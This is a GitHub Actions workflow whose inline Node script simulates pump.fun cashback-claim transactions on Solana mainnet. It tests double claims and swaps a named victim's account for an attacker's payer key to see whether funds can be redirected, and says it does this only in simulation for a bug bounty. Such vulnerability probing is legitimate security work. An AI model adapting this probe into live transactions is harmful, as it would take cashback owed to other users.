name: cashback-claim-runtime-differential

on:
  push:
    paths:
      - '.github/workflows/cashback-claim-runtime-differential.yml'
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-24.04
    timeout-minutes: 6
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: 24
      - run: npm install --no-save @pump-fun/pump-sdk@1.36.0 @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token
      - name: Simulation-only cashback claim differentials
        shell: bash
        run: |
          node --input-type=module <<'NODE'
          import crypto from 'node:crypto';
          import {PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
          import {NATIVE_MINT,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,getAssociatedTokenAddressSync} from '@solana/spl-token';
          import * as p from '@pump-fun/pump-sdk';
          import * as a from '@pump-fun/pump-swap-sdk';

          const RPC='https://api.mainnet-beta.solana.com';
          const PAYER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
          const PUMP_USER=new PublicKey('bwamJzztZsepfkteWRChggmXuiiCQvpLqPietdNfSXa');
          const AMM_USER=new PublicKey('EzXcJ2m3nvMp8Gmh4Y3fTCyDywxXxYRnwQpZesaf9wfV');
          let id=1;
          async function rpc(method,params){const ctl=new AbortController(),timer=setTimeout(()=>ctl.abort(),12000);try{const r=await fetch(RPC,{method:'POST',signal:ctl.signal,headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-cashback/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});if(!r.ok)throw Error('HTTP '+r.status);const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}finally{clearTimeout(timer)}}
          const safe=v=>{if(v==null)return v;if(typeof v==='bigint')return v.toString();if(v?.toBase58)return v.toBase58();if(v?.constructor?.name==='BN')return v.toString();if(Array.isArray(v))return v.map(safe);if(typeof v==='object'){const o={};for(const [k,z] of Object.entries(v))o[k]=safe(z);return o}return v};
          const hash=b=>crypto.createHash('sha256').update(b).digest('hex').slice(0,24);
          function parse(logs){const xs=logs??[],t=xs.join('\n');return {code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,interesting:xs.filter(x=>/Instruction:|AnchorError|Error Code|Error Number|cashback|accumulator|Transfer|failed|success|claim/i.test(x)).slice(-130)}}
          function decodeRpc(raw){return raw?.data?.[0]?{data:Buffer.from(raw.data[0],'base64'),lamports:raw.lamports,owner:new PublicKey(raw.owner),executable:raw.executable,rentEpoch:raw.rentEpoch??0}:null}
          function tokenAmount(raw){if(!raw?.data?.[0])return null;const b=Buffer.from(raw.data[0],'base64');return b.length>=72?b.readBigUInt64LE(64):null}

          console.log('PUMP_CASHBACK_METHOD',String(p.PUMP_SDK.claimCashbackInstruction).slice(0,16000));
          for(const k of Object.getOwnPropertyNames(a.PumpAmmSdk.prototype).filter(x=>/cashback/i.test(x)))console.log('AMM_CASHBACK_METHOD',k,String(a.PumpAmmSdk.prototype[k]).slice(0,16000));

          // Pump native-SOL cashback.
          const pIx=await p.PUMP_SDK.claimCashbackInstruction(PUMP_USER);
          const pAcc=pIx.keys[1].pubkey;
          const pPreRaw=(await rpc('getMultipleAccounts',[[PUMP_USER.toBase58(),pAcc.toBase58()],{encoding:'base64',commitment:'confirmed'}])).value;
          const pPreInfo=decodeRpc(pPreRaw[1]),pDecoded=p.PUMP_SDK.decodeUserVolumeAccumulator(pPreInfo);
          const pClaimable=BigInt(pDecoded.cashbackEarned.toString())-BigInt(pDecoded.totalCashbackClaimed.toString());
          console.log('PUMP_CONTEXT',JSON.stringify({user:PUMP_USER.toBase58(),acc:pAcc.toBase58(),decoded:safe(pDecoded),claimable:pClaimable.toString(),keys:pIx.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable}))},null,2));

          async function sim(label,ixs,watch){const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;const tx=new VersionedTransaction(new TransactionMessage({payerKey:PAYER,recentBlockhash:bh,instructions:ixs}).compileToV0Message());const raw=Buffer.from(tx.serialize()).toString('base64');const v=(await rpc('simulateTransaction',[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}])).value,e=parse(v.logs);return {v,e,accounts:v.accounts??[]}}
          function sysLam(a){return a?BigInt(a.lamports):null}
          function mutKey(ix,index,pk){const ks=ix.keys.map(k=>({...k}));ks[index].pubkey=pk;return new TransactionInstruction({programId:ix.programId,keys:ks,data:Buffer.from(ix.data)})}

          const pOne=await sim('PUMP_ONE',[pIx],[PUMP_USER,pAcc,PAYER]);
          const pTwo=await sim('PUMP_TWO',[pIx,pIx],[PUMP_USER,pAcc,PAYER]);
          const victimIdx=pIx.keys.findIndex(k=>k.pubkey.equals(PUMP_USER));
          const pRedirect=await sim('PUMP_REDIRECT_USER_TO_PAYER',[mutKey(pIx,victimIdx,PAYER)],[PUMP_USER,pAcc,PAYER]);
          function pumpOut(label,r){const u=sysLam(r.accounts[0]),accRaw=r.accounts[1],att=sysLam(r.accounts[2]);let dec=null;try{if(accRaw?.data?.[0])dec=p.PUMP_SDK.decodeUserVolumeAccumulator(decodeRpc(accRaw))}catch{}return {label,err:r.v.err,code:r.e.code,num:r.e.num,account:r.e.account,userLamports:u?.toString()??null,userDelta:u!=null?(u-BigInt(pPreRaw[0].lamports)).toString():null,attackerLamports:att?.toString()??null,decodedAcc:safe(dec),accHash:accRaw?.data?.[0]?hash(Buffer.from(accRaw.data[0],'base64')):null,interesting:r.e.interesting}}
          console.log('PUMP_ONE',JSON.stringify(pumpOut('one',pOne),null,2));
          console.log('PUMP_TWO',JSON.stringify(pumpOut('two',pTwo),null,2));
          console.log('PUMP_REDIRECT',JSON.stringify(pumpOut('redirect',pRedirect),null,2));

          // AMM WSOL cashback. Build directly from the current IDL-backed Anchor client if public wrapper differs.
          let aIx=null;
          for(const name of ['claimCashbackInstruction','claimCashback']){const fn=a.PUMP_AMM_SDK[name];if(typeof fn!=='function')continue;for(const args of [[AMM_USER],[{user:AMM_USER,quoteMint:NATIVE_MINT,quoteTokenProgram:TOKEN_PROGRAM_ID}]]){try{const z=await fn.apply(a.PUMP_AMM_SDK,args);const arr=Array.isArray(z)?z:[z];const q=arr.find(x=>x?.programId?.equals?.(new PublicKey('pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA')));if(q){aIx=q;console.log('AMM_BUILDER_USED',name,JSON.stringify(args.map(safe)));break}}catch(e){console.log('AMM_BUILD_TRY_FAIL',name,JSON.stringify(args.map(safe)),String(e).slice(0,250))}}if(aIx)break}
          if(!aIx){try{aIx=await a.PUMP_AMM_SDK.offlineProgram.methods.claimCashback().accountsPartial({user:AMM_USER,quoteMint:NATIVE_MINT,quoteTokenProgram:TOKEN_PROGRAM_ID}).instruction();console.log('AMM_BUILDER_USED','offlineProgram')}catch(e){console.log('AMM_DIRECT_BUILD_FAIL',String(e).slice(0,1000))}}
          if(!aIx){console.log('AMM_CASHBACK_SKIPPED_NO_BUILDER');process.exit(0)}
          console.log('AMM_KEYS',JSON.stringify(aIx.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
          const aAcc=aIx.keys.find((k,i)=>i>0&&k.pubkey.toBase58()!==AMM_USER.toBase58()&&k.pubkey.toBase58()!==NATIVE_MINT.toBase58()&&k.pubkey.toBase58()!==TOKEN_PROGRAM_ID.toBase58()&&k.pubkey.toBase58()!=='11111111111111111111111111111111'&&k.pubkey.toBase58()!=='pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA')?.pubkey;
          // Reliable accumulator is the second account in current claim_cashback IDL.
          const ammAcc=aIx.keys[1].pubkey;
          const accAta=getAssociatedTokenAddressSync(NATIVE_MINT,ammAcc,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
          const userAta=getAssociatedTokenAddressSync(NATIVE_MINT,AMM_USER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
          const attackerAta=getAssociatedTokenAddressSync(NATIVE_MINT,PAYER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
          const aPre=(await rpc('getMultipleAccounts',[[ammAcc.toBase58(),accAta.toBase58(),userAta.toBase58(),attackerAta.toBase58()],{encoding:'base64',commitment:'confirmed'}])).value;
          const aDec=a.PUMP_AMM_SDK.decodeUserVolumeAccumulator(decodeRpc(aPre[0])),aClaim=BigInt(aDec.cashbackEarned.toString())-BigInt(aDec.totalCashbackClaimed.toString());
          console.log('AMM_CONTEXT',JSON.stringify({user:AMM_USER.toBase58(),acc:ammAcc.toBase58(),accAta:accAta.toBase58(),userAta:userAta.toBase58(),attackerAta:attackerAta.toBase58(),decoded:safe(aDec),claimable:aClaim.toString(),preAmounts:{accAta:tokenAmount(aPre[1])?.toString()??null,userAta:tokenAmount(aPre[2])?.toString()??null,attackerAta:tokenAmount(aPre[3])?.toString()??null}},null,2));
          const aOne=await sim('AMM_ONE',[aIx],[ammAcc,accAta,userAta,attackerAta]);
          const aTwo=await sim('AMM_TWO',[aIx,aIx],[ammAcc,accAta,userAta,attackerAta]);
          const aUserIdx=aIx.keys.findIndex(k=>k.pubkey.equals(AMM_USER));const aRed=await sim('AMM_REDIRECT_USER_TO_PAYER',[mutKey(aIx,aUserIdx,PAYER)],[ammAcc,accAta,userAta,attackerAta]);
          function ammOut(label,r){const decRaw=r.accounts[0];let dec=null;try{if(decRaw?.data?.[0])dec=a.PUMP_AMM_SDK.decodeUserVolumeAccumulator(decodeRpc(decRaw))}catch{}return {label,err:r.v.err,code:r.e.code,num:r.e.num,account:r.e.account,decodedAcc:safe(dec),amounts:{accAta:tokenAmount(r.accounts[1])?.toString()??null,userAta:tokenAmount(r.accounts[2])?.toString()??null,attackerAta:tokenAmount(r.accounts[3])?.toString()??null},interesting:r.e.interesting}}
          console.log('AMM_ONE',JSON.stringify(ammOut('one',aOne),null,2));
          console.log('AMM_TWO',JSON.stringify(ammOut('two',aTwo),null,2));
          console.log('AMM_REDIRECT',JSON.stringify(ammOut('redirect',aRed),null,2));
          NODE
